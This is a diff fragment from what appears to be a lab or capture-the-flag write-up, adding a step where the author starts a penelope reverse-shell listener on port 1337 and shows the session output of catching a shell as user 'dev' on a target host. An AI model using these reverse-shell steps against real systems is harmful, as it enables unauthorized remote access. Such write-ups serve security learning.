@@ -354,4 +354,22 @@ First ill set a listener
 
 ![](Pasted%20image%2020260725202204.png)
 
-Then grab the shell from revshells 
+Then grab the shell from revshells, enable pasting then run the process
+
+```python
+penelope -p 1337         
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.15.232
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => store 10.129.238.32 Linux-x86_64 👤 dev(1001) 😍️ Session ID <1>
+[+] Upgrading shell to PTY...
+[+] PTY upgrade successful via /usr/bin/python3
+[+] Interacting with session [1] • PTY • Menu key F12 ⇐
+[+] Session log: /home/kali/.penelope/sessions/store~10.129.238.32-Linux-x86_64/2026_07_25-20_21_31-008.log
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+dev@store:~/projects/store1$ whoami
+dev
+dev@store:~/projects/store1$
+```
+
+I now have a shell!
+
